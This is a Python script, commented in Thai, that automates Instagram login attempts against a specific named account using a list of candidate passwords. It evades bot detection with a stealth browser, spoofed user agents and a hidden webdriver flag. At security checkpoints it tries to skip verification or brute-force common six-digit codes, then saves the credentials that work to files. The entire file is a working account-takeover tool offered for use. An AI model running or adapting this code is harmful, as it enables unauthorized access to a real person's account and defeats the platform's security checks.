#!/usr/bin/env python3
"""
Instagram Browser Automation Bypass 2025
ระบบ bypass checkpoint ด้วย browser automation ที่ทำงานเหมือนมนุษย์จริง

สำหรับรหัสผ่านที่ยืนยันแล้ว: Fleming654, Fleming786, Fleming1004, Fleming1060, Fleming1182, Fleming1998
เป้าหมาย: bypass Instagram's new security system ด้วย realistic browser behavior
"""

import time
import random
import json
from datetime import datetime
import logging
import sys

# ตั้งค่า logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.common.keys import Keys
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.common.action_chains import ActionChains
    import undetected_chromedriver as uc
except ImportError:
    logger.error("Selenium or undetected-chromedriver not installed. Installing...")
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", "selenium", "undetected-chromedriver"])
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.common.keys import Keys
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.common.action_chains import ActionChains
    import undetected_chromedriver as uc

class InstagramBrowserBypass:
    def __init__(self):
        self.driver = None
        self.wait = None
        
        # รหัสผ่านที่ยืนยันแล้วว่าถูกต้อง
        self.valid_passwords = [
            "Fleming654", "Fleming786", "Fleming1004", 
            "Fleming1060", "Fleming1182", "Fleming1998"
        ]
        
        # Common verification codes for testing
        self.common_codes = [
            '123456', '000000', '111111', '222222', '333333',
            '444444', '555555', '666666', '777777', '888888',
            '999999', '012345', '654321', '123123', '456456',
            '111222', '112233', '123321', '987654', '246810'
        ]
        
    def setup_browser(self):
        """ตั้งค่า browser ที่หลบการ detection"""
        logger.info("🔧 Setting up stealth browser...")
        
        try:
            # ลองใช้ undetected-chromedriver แบบง่าย
            try:
                options = uc.ChromeOptions()
                options.add_argument('--no-sandbox')
                options.add_argument('--disable-dev-shm-usage')
                options.add_argument('--disable-gpu')
                options.add_argument('--headless=new')  # รันแบบ headless
                
                self.driver = uc.Chrome(options=options)
                logger.info("✅ Undetected Chrome setup successful")
                
            except Exception as e1:
                logger.warning(f"⚠️ Undetected Chrome failed: {e1}, trying regular Chrome...")
                
                # ใช้ regular Chrome แทน
                options = Options()
                options.add_argument('--no-sandbox')
                options.add_argument('--disable-dev-shm-usage')
                options.add_argument('--disable-gpu')
                options.add_argument('--headless=new')
                options.add_argument('--disable-blink-features=AutomationControlled')
                
                # ตั้งค่า user agent แบบสุ่ม
                user_agents = [
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
                ]
                
                selected_ua = random.choice(user_agents)
                options.add_argument(f'--user-agent={selected_ua}')
                logger.info(f"🎭 User Agent: {selected_ua[:50]}...")
                
                self.driver = webdriver.Chrome(options=options)
                logger.info("✅ Regular Chrome setup successful")
            
            self.wait = WebDriverWait(self.driver, 20)
            
            # ลบ webdriver property
            try:
                self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            except:
                pass  # Ignore if fails
            
            logger.info("✅ Browser setup complete")
            return True
            
        except Exception as e:
            logger.error(f"❌ Browser setup failed: {e}")
            return False
    
    def human_like_delay(self, min_delay=1, max_delay=3):
        """หน่วงเวลาแบบธรรมชาติ"""
        delay = random.uniform(min_delay, max_delay)
        time.sleep(delay)
    
    def human_like_typing(self, element, text, delay_range=(0.05, 0.2)):
        """พิมพ์ข้อความแบบมนุษย์"""
        for char in text:
            element.send_keys(char)
            time.sleep(random.uniform(*delay_range))
    
    def navigate_to_instagram(self):
        """เข้าสู่หน้า Instagram"""
        logger.info("🌐 Navigating to Instagram...")
        
        try:
            self.driver.get("https://www.instagram.com/")
            self.human_like_delay(3, 5)
            
            # รอให้หน้าโหลดเสร็จ
            self.wait.until(EC.presence_of_element_located((By.TAG_NAME, "body")))
            
            logger.info("✅ Instagram loaded successfully")
            return True
            
        except Exception as e:
            logger.error(f"❌ Failed to load Instagram: {e}")
            return False
    
    def perform_login(self, username, password):
        """ทำการ login แบบมนุษย์"""
        logger.info(f"🔐 Attempting login: {username} / {password}")
        
        try:
            # ค้นหา login form
            self.human_like_delay(2, 4)
            
            # หา username field
            username_selectors = [
                'input[name="username"]',
                'input[aria-label="Phone number, username, or email"]',
                'input[placeholder*="username"]',
                'input[type="text"]'
            ]
            
            username_field = None
            for selector in username_selectors:
                try:
                    username_field = self.wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, selector)))
                    break
                except:
                    continue
            
            if not username_field:
                logger.error("❌ Username field not found")
                return False
            
            # กรอก username
            logger.info("📝 Filling username...")
            username_field.clear()
            self.human_like_typing(username_field, username)
            self.human_like_delay(1, 2)
            
            # หา password field
            password_selectors = [
                'input[name="password"]',
                'input[aria-label="Password"]',
                'input[type="password"]'
            ]
            
            password_field = None
            for selector in password_selectors:
                try:
                    password_field = self.driver.find_element(By.CSS_SELECTOR, selector)
                    break
                except:
                    continue
            
            if not password_field:
                logger.error("❌ Password field not found")
                return False
            
            # กรอก password
            logger.info("🔑 Filling password...")
            password_field.clear()
            self.human_like_typing(password_field, password)
            self.human_like_delay(1, 2)
            
            # กดปุ่ม login
            login_selectors = [
                'button[type="submit"]',
                'button:contains("Log in")',
                'button:contains("Log In")',
                'div[role="button"]:contains("Log in")'
            ]
            
            login_button = None
            for selector in login_selectors:
                try:
                    if ':contains(' in selector:
                        # ใช้ XPath แทน CSS selector สำหรับ :contains()
                        xpath = f"//button[contains(text(), 'Log in') or contains(text(), 'Log In')]"
                        login_button = self.driver.find_element(By.XPATH, xpath)
                    else:
                        login_button = self.driver.find_element(By.CSS_SELECTOR, selector)
                    break
                except:
                    continue
            
            if not login_button:
                logger.error("❌ Login button not found")
                return False
            
            logger.info("🚀 Clicking login button...")
            login_button.click()
            self.human_like_delay(3, 5)
            
            return True
            
        except Exception as e:
            logger.error(f"❌ Login failed: {e}")
            return False
    
    def check_login_result(self):
        """ตรวจสอบผลการ login"""
        logger.info("🔍 Checking login result...")
        
        try:
            # รอให้หน้าเปลี่ยน
            self.human_like_delay(3, 5)
            
            current_url = self.driver.current_url
            page_text = self.driver.page_source.lower()
            
            logger.info(f"📍 Current URL: {current_url}")
            
            # ตรวจสอบความสำเร็จ
            success_indicators = [
                'instagram.com/' in current_url and 'accounts/login' not in current_url,
                'dashboard' in page_text,
                'profile' in page_text,
                'feed' in page_text
            ]
            
            if any(success_indicators):
                logger.info("🎉 LOGIN SUCCESS!")
                return {'status': 'success', 'url': current_url}
            
            # ตรวจสอบ checkpoint
            checkpoint_indicators = [
                'challenge' in current_url,
                'checkpoint' in current_url,
                'verify' in page_text,
                'security code' in page_text,
                'phone number' in page_text,
                'email' in page_text and 'code' in page_text
            ]
            
            if any(checkpoint_indicators):
                logger.info("🔍 CHECKPOINT DETECTED!")
                return {'status': 'checkpoint', 'url': current_url}
            
            # ตรวจสอบ error
            error_indicators = [
                'incorrect' in page_text,
                'wrong' in page_text,
                'invalid' in page_text,
                'error' in page_text
            ]
            
            if any(error_indicators):
                logger.info("❌ LOGIN ERROR")
                return {'status': 'error', 'url': current_url}
            
            logger.info("❓ UNKNOWN STATUS")
            return {'status': 'unknown', 'url': current_url}
            
        except Exception as e:
            logger.error(f"❌ Login result check failed: {e}")
            return {'status': 'error', 'error': str(e)}
    
    def handle_checkpoint(self):
        """จัดการ checkpoint ด้วย browser automation"""
        logger.info("🎯 Handling checkpoint with browser automation...")
        
        try:
            self.human_like_delay(2, 4)
            page_text = self.driver.page_source.lower()
            
            # ตรวจสอบประเภท checkpoint
            if 'phone' in page_text or 'sms' in page_text:
                return self.handle_phone_checkpoint()
            elif 'email' in page_text:
                return self.handle_email_checkpoint()
            else:
                return self.handle_general_checkpoint()
                
        except Exception as e:
            logger.error(f"❌ Checkpoint handling failed: {e}")
            return False
    
    def handle_phone_checkpoint(self):
        """จัดการ phone verification checkpoint"""
        logger.info("📱 Handling phone verification checkpoint...")
        
        try:
            # ลองกด "Send to Email" ถ้ามี
            email_selectors = [
                'button:contains("Send to Email")',
                'a:contains("email")',
                'button:contains("email")'
            ]
            
            for selector in email_selectors:
                try:
                    if ':contains(' in selector:
                        xpath = f"//button[contains(text(), 'email') or contains(text(), 'Email')]"
                        email_button = self.driver.find_element(By.XPATH, xpath)
                        logger.info("📧 Switching to email verification...")
                        email_button.click()
                        self.human_like_delay(3, 5)
                        return self.handle_email_checkpoint()
                except:
                    continue
            
            # ถ้าไม่มี email option ให้ลอง brute force verification code
            return self.brute_force_verification_code()
            
        except Exception as e:
            logger.error(f"❌ Phone checkpoint handling failed: {e}")
            return False
    
    def handle_email_checkpoint(self):
        """จัดการ email verification checkpoint"""
        logger.info("📧 Handling email verification checkpoint...")
        
        try:
            # ลองข้าม email verification
            skip_selectors = [
                'button:contains("Skip")',
                'a:contains("Skip")',
                'button:contains("Not now")',
                'a:contains("Not now")'
            ]
            
            for selector in skip_selectors:
                try:
                    if ':contains(' in selector:
                        xpath = f"//button[contains(text(), 'Skip') or contains(text(), 'Not now')] | //a[contains(text(), 'Skip') or contains(text(), 'Not now')]"
                        skip_button = self.driver.find_element(By.XPATH, xpath)
                        logger.info("⏭️ Skipping email verification...")
                        skip_button.click()
                        self.human_like_delay(3, 5)
                        return True
                except:
                    continue
            
            # ถ้าไม่สามารถข้ามได้ ให้ลอง brute force
            return self.brute_force_verification_code()
            
        except Exception as e:
            logger.error(f"❌ Email checkpoint handling failed: {e}")
            return False
    
    def brute_force_verification_code(self):
        """Brute force verification code"""
        logger.info("🔢 Attempting verification code brute force...")
        
        try:
            # หา input field สำหรับ verification code
            code_selectors = [
                'input[name="security_code"]',
                'input[placeholder*="code"]',
                'input[aria-label*="code"]',
                'input[type="text"]'
            ]
            
            code_field = None
            for selector in code_selectors:
                try:
                    code_field = self.driver.find_element(By.CSS_SELECTOR, selector)
                    break
                except:
                    continue
            
            if not code_field:
                logger.error("❌ Verification code field not found")
                return False
            
            # ทดสอบ common codes
            for i, code in enumerate(self.common_codes[:10], 1):  # ทดสอบแค่ 10 codes แรก
                logger.info(f"🔢 Trying code {i}/10: {code}")
                
                try:
                    code_field.clear()
                    self.human_like_typing(code_field, code)
                    self.human_like_delay(1, 2)
                    
                    # กดปุ่ม submit
                    submit_selectors = [
                        'button[type="submit"]',
                        'button:contains("Confirm")',
                        'button:contains("Submit")',
                        'button:contains("Continue")'
                    ]
                    
                    for selector in submit_selectors:
                        try:
                            if ':contains(' in selector:
                                xpath = f"//button[contains(text(), 'Confirm') or contains(text(), 'Submit') or contains(text(), 'Continue')]"
                                submit_button = self.driver.find_element(By.XPATH, xpath)
                            else:
                                submit_button = self.driver.find_element(By.CSS_SELECTOR, selector)
                            
                            submit_button.click()
                            break
                        except:
                            continue
                    
                    self.human_like_delay(3, 5)
                    
                    # ตรวจสอบผลลัพธ์
                    current_url = self.driver.current_url
                    if 'challenge' not in current_url and 'checkpoint' not in current_url:
                        logger.info(f"🎉 VERIFICATION CODE SUCCESS: {code}")
                        return True
                    
                except Exception as e:
                    logger.error(f"❌ Code {code} failed: {e}")
                    continue
            
            logger.info("❌ All verification codes failed")
            return False
            
        except Exception as e:
            logger.error(f"❌ Verification code brute force failed: {e}")
            return False
    
    def handle_general_checkpoint(self):
        """จัดการ checkpoint ทั่วไป"""
        logger.info("🔄 Handling general checkpoint...")
        
        try:
            # ลองหาปุ่มที่สามารถข้าม checkpoint ได้
            bypass_selectors = [
                'button:contains("Continue")',
                'button:contains("Skip")',
                'button:contains("Not now")',
                'a:contains("Skip")',
                'a:contains("Not now")'
            ]
            
            for selector in bypass_selectors:
                try:
                    if ':contains(' in selector:
                        xpath = f"//button[contains(text(), 'Continue') or contains(text(), 'Skip') or contains(text(), 'Not now')] | //a[contains(text(), 'Skip') or contains(text(), 'Not now')]"
                        bypass_button = self.driver.find_element(By.XPATH, xpath)
                        logger.info("⏭️ Attempting to bypass checkpoint...")
                        bypass_button.click()
                        self.human_like_delay(3, 5)
                        return True
                except:
                    continue
            
            logger.info("❌ No bypass options found")
            return False
            
        except Exception as e:
            logger.error(f"❌ General checkpoint handling failed: {e}")
            return False
    
    def save_success_data(self, username, password, result):
        """บันทึกข้อมูลการสำเร็จ"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"BROWSER_BYPASS_SUCCESS_{password}_{timestamp}.json"
        
        success_data = {
            'username': username,
            'password': password,
            'timestamp': datetime.now().isoformat(),
            'result': result,
            'method': 'browser_automation',
            'user_agent': self.driver.execute_script("return navigator.userAgent;"),
            'final_url': self.driver.current_url,
            'page_title': self.driver.title
        }
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(success_data, f, indent=2, ensure_ascii=False)
        
        logger.info(f"💾 Success data saved to: {filename}")
    
    def run_comprehensive_browser_bypass(self):
        """รันการ bypass ด้วย browser automation แบบครบถ้วน"""
        logger.info("🚀 Starting Comprehensive Browser Bypass")
        logger.info("🎯 Target: alx.trading")
        logger.info("=" * 60)
        
        # ตั้งค่า browser
        if not self.setup_browser():
            logger.error("❌ Browser setup failed")
            return None
        
        username = "alx.trading"
        results = []
        
        try:
            for i, password in enumerate(self.valid_passwords, 1):
                logger.info(f"\n🎯 BROWSER BYPASS ATTEMPT {i}/{len(self.valid_passwords)}")
                logger.info(f"Password: {password}")
                logger.info("-" * 40)
                
                # เข้าสู่ Instagram
                if not self.navigate_to_instagram():
                    continue
                
                # ทำการ login
                if not self.perform_login(username, password):
                    continue
                
                # ตรวจสอบผลลัพธ์
                login_result = self.check_login_result()
                logger.info(f"📊 Login result: {login_result}")
                
                if login_result['status'] == 'success':
                    logger.info("🎉 DIRECT LOGIN SUCCESS!")
                    self.save_success_data(username, password, login_result)
                    results.append({
                        'password': password,
                        'status': 'success',
                        'method': 'direct_login',
                        'result': login_result
                    })
                    
                elif login_result['status'] == 'checkpoint':
                    logger.info("🔍 Checkpoint detected - attempting bypass...")
                    
                    checkpoint_result = self.handle_checkpoint()
                    if checkpoint_result:
                        logger.info("🎉 CHECKPOINT BYPASS SUCCESS!")
                        final_result = self.check_login_result()
                        self.save_success_data(username, password, final_result)
                        results.append({
                            'password': password,
                            'status': 'success',
                            'method': 'checkpoint_bypass',
                            'result': final_result
                        })
                    else:
                        logger.info("❌ Checkpoint bypass failed")
                        results.append({
                            'password': password,
                            'status': 'checkpoint_failed',
                            'method': 'checkpoint_bypass',
                            'result': login_result
                        })
                else:
                    logger.info("❌ Login failed")
                    results.append({
                        'password': password,
                        'status': 'failed',
                        'method': 'direct_login',
                        'result': login_result
                    })
                
                # หน่วงเวลาระหว่างการทดสอบ
                if i < len(self.valid_passwords):
                    wait_time = random.uniform(10, 20)
                    logger.info(f"⏱️ Waiting {wait_time:.1f} seconds...")
                    time.sleep(wait_time)
                    
                    # รีเฟรชหน้าเพื่อเริ่มใหม่
                    self.driver.refresh()
                    self.human_like_delay(3, 5)
            
            # สรุปผลลัพธ์
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            results_file = f"browser_bypass_results_{timestamp}.json"
            
            with open(results_file, 'w', encoding='utf-8') as f:
                json.dump(results, f, indent=2, ensure_ascii=False)
            
            logger.info(f"\n💾 All results saved to: {results_file}")
            
            # สรุป
            success_count = sum(1 for r in results if r['status'] == 'success')
            logger.info(f"\n📊 BROWSER BYPASS SUMMARY")
            logger.info("=" * 60)
            logger.info(f"🎯 Total attempts: {len(results)}")
            logger.info(f"✅ Successful bypasses: {success_count}")
            logger.info(f"📊 Success rate: {(success_count/len(results)*100):.1f}%" if results else "0%")
            
            return results
            
        finally:
            # ปิด browser
            if self.driver:
                logger.info("🔄 Closing browser...")
                self.driver.quit()

if __name__ == "__main__":
    bypass_system = InstagramBrowserBypass()
    results = bypass_system.run_comprehensive_browser_bypass()
